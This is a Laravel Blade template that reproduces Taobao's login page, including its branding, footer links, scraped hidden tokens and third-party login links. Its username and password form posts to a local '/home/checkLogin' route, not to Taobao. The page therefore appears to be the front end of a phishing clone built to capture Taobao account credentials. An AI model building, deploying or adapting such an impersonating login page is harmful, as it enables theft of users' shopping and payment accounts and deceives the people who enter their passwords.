<html class="ks-webkit537 ks-webkit ks-chrome46 ks-chrome">
<head>
    ...
    <link type="text/css" href="{{asset('css/nc.css')}}" rel="stylesheet" disabled="">


    <link rel="stylesheet" href="{{asset('css/new-loginV2-0.5.32.css')}}">
    <link rel="stylesheet" href="{{asset('css/page.css')}}">

    <style>@charset "utf-8";
        @font-face {
            font-family: 'nc_iconfont';
            src: url("./fonts/font_1465353706_4784257.eot");
            src: url("./fonts/font_1465353706_4784257iefix.eot") format('embedded-opentype'), url("./fonts/font_1465353706_4784257.woff") format('woff'), url("./fonts/font_1465353706_4784257.ttf") format('truetype'), url("./fonts/font_1465353706_4784257.svg#iconfont") format('svg')
        }
        ...
        .nc-container .nc_scale .nc-cc-loading-img {
            ...
            *zoom: 1;
            ...
            word-spacing: normal;
            vertical-align: middle;
            background: url("./images/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;
            width: 14px;
            height: 14px;
            position: relative;
            top: -1px;
...
<div id="page" class="">
    ...
    <div id="content">
        ...
        <div class="login-newbg"
             style="background-image: url(./images/TB1MIgKOXXXXXXjXFXXXXXXXXXX-2500-600.jpg);height:600px;">
        ...
        <div class="login-adlink">
            <a href="https://www.taobao.com/markets/quality/cdhc" target="_blank"
               onclick="javascript:goldlog.record('/member.11.2','','','H46777405')"></a>
        </div>
            ...
            <div class="login-box-warp">
                ...
                <div class="login-box no-longlogin module-static" id="J_LoginBox">
                    ...
                    <div class="hd">
                        ...
                        <div class="login-switch" onselectstart="return false;">
                            <i class="iconfont quick" id="J_Static2Quick"
                               onclick="javascript:goldlog.record('/member.13.1','','','H46777383')"></i>
                    ...
                    <div class="bd">
                        ...
                        <div id="J_MiserLogin" class="ww-login hidden" style="display: none;">
                            <form action="" class="ww-form">
                                <input type="hidden" id="x_token"
                                       value="|1479221697950-5183023066569871774nPJnaT8AXteZOzPQ99T6mQ==">
                                <div class="login-title">
                                    选择其中一个已登录的账户
                                </div>
                                ...
                                <div class="submit">
                                    ...
                                    <button type="submit" tabindex="5" id="J_SubmitMiser">登 录</button>
                                </div>
                                <div class="other-login">
                        ...
                        <div class="static-form " id="J_StaticForm">
                            ...
                            <form action="/home/checkLogin" method="post" id="J_Form">
                                  {!! csrf_field() !!}
                                <div class="field username-field">
                                    <label for="TPL_username_1"> <i class="iconfont" title="会员名"></i></label>
                                    
									<input type="text" name="TPL_username" id="TPL_username_1" class="login-text J_UserName" value="" maxlength="32" tabindex="1" placeholder="手机号/会员名/邮箱">
                                </div>
                				...
                				<span id="J_StandardPwd">
                				   <input type="password" name="TPL_password" id="TPL_password_1" class="login-text" maxlength="40" tabindex="2" autocomplete="off" aria-label="登录密码">
                				</span>
                                </div>
                                ...
                                <div class="submit">
                                    ...
                                    <input id="J_NcoToken" type="hidden" name="ncoToken"
                                           value="cf77ab9fc82c39d0e9e549113a8fa5ee78f2cdc6">
                                    <input id="J_NcoShow" type="hidden" name="slideCodeShow" value="false">


                                    <input type="hidden" id="J_lang" name="lang" value="zh_CN">
                                    <input type="hidden" name="loginsite" value="0" id="J_loginsite"> <input
                                        type="hidden" name="newlogin" value="">
                                    ...
                                    <input type="hidden" id="gvfdc" name="gvfdcname" value="10">
                                    <input type="hidden" name="gvfdcre"
                                           value="68747470733A2F2F7777772E74616F62616F2E636F6D2F">
                                    ...
                                    <input type="hidden" name="oslanguage" value="zh-CN">
                                    <input type="hidden" name="sr" value="1440*900"> <input type="hidden" name="osVer"
                                                                                            value="windows|6.1">
                                    <input type="hidden" name="naviVer" value="chrome|46.0249086">
                                    <input type="hidden" name="miserHardInfo" id="M_hard_info">
                                    <input type="hidden" id="J_Appkey" name="appkey" value="">

                                    <input id="J_UnitClose " value="true" type="hidden">
                                    <button type="submit" class="J_Submit" tabindex="3" id="J_SubmitStatic"
                                            data-ing="正在登录...">登 录
                                    </button>
                                </div>
                                ...
                                <ul class="entries">
                                    <li id="J_OtherLogin" class="other-login">
                                        ...
                                        <a href="http://weibo.com/login.php?entry=taobao&amp;goto=https%3A%2F%2Flogin.taobao.com%2Faso%2Ftvs%3Fdomain%3Dweibo%26sid%3Dba7094f8746b210eedc7e8c6d5d8330f%26target%3D687474703A2F2F7777772E74616F62616F2E636F6D2F&amp;goto2=http%3A%2F%2Fwww.taobao.com%2F"
                                           tabindex="4" class="weibo-login"><i class="iconfont"></i>微博登录</a>

                                        <a href="https://auth.alipay.com/login/index.htm?loginScene=7&amp;goto=https%3A%2F%2Fauth.alipay.com%2Flogin%2Ftaobao_trust_login.htm%3Ftarget%3Dhttps%253A%252F%252Flogin.taobao.com%252Fmember%252Falipay_sign_dispatcher.jhtml%253Ftg%253Dhttp%25253A%25252F%25252Fwww.taobao.com%25252F&amp;params=VFBMX3JlZGlyZWN0X3VybD1odHRwJTNBJTJGJTJGd3d3LnRhb2Jhby5jb20lMkY%3D"
                                ...
                                <div class="login-links">
                                    ...
                                    <a href="#"
                                       tabindex="6" class="forget-pwd" target="_blank">
                                        忘记密码</a>
                                    <a href="/r_one" class="register"
                                       target="_blank" tabindex="7">免费注册</a>

                                </div>
                                <input type="hidden" name="ua" id="UA_InputId"
                                       value="082#"><input type="hidden" name="um_token" value="HV01PAAZ0bfa38c679451552582b21e8004eff5e">
                            </form>
                        </div>
                            ...
                            <div class="qrcode-login" id="J_QRCodeLogin">
                                ...
                                <div class="qrcode-mod">
                                    ...
                                    <div class="qrcode-desc" data-spm="25847036">
                                        ...
                                        <p><font class="ft-gray">打开 </font><a href="https://www.taobao.com/m"
                                                                              target="_blank"
                                                                              class="light-link">手机淘宝</a> | <a
                                ...
                                <div class="qrcode-msg">
                                    <div class="msg-ok">
                                        ...
                                        <h6>扫描成功！</h6>
                                        <p>请在手机上确认登录</p>
                                        <div class="link"><a href="#" class="light-link J_QRCodeRefresh">返回二维码登录</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="login-links">
...
<!--  <div data-spm="1000339" class="login-extra">
    <div style="margin-bottom: 10px;">
        手机登录<a id="J_MTaobao" href="http://www.taobao.com/wap/mobile/">m.taobao.com</a>，随时随地购物
    </div>
    <div>
        <p>
            高速安全、一键免登，推荐UC浏览器.<a id='J_TBBrowser'
                href='http://down2.uc.cn/pcbrowser/index.php?id=101&pid=4449'>点此下载&gt;&gt;</a>
        </p>
    </div>
</div> -->
<div class="footer" data-spm="1997523009">
    ...
    <div class="footer-hd">
        <p>
            ...
            <b>|</b>
            <a href="http://trip.taobao.com">淘宝旅行</a>
            <b>|</b>
    ...
    <div class="footer-bd">
        <p>
            ...
            <a href="http://www.taobao.com/go/chn/tb-fp/2014/law.php">法律声明</a>
    ...
    <div class="footer-ft">
        <a href="http://www.pingpinganan.gov.cn/web/index.aspx?file=index.aspx">
            <img width="36" height="36" src="{{asset('images/wj.gif')}}">
        </a>
    ...
    <!-- #footer END -->
    <div id="server-num">login010178104121.et2</div>
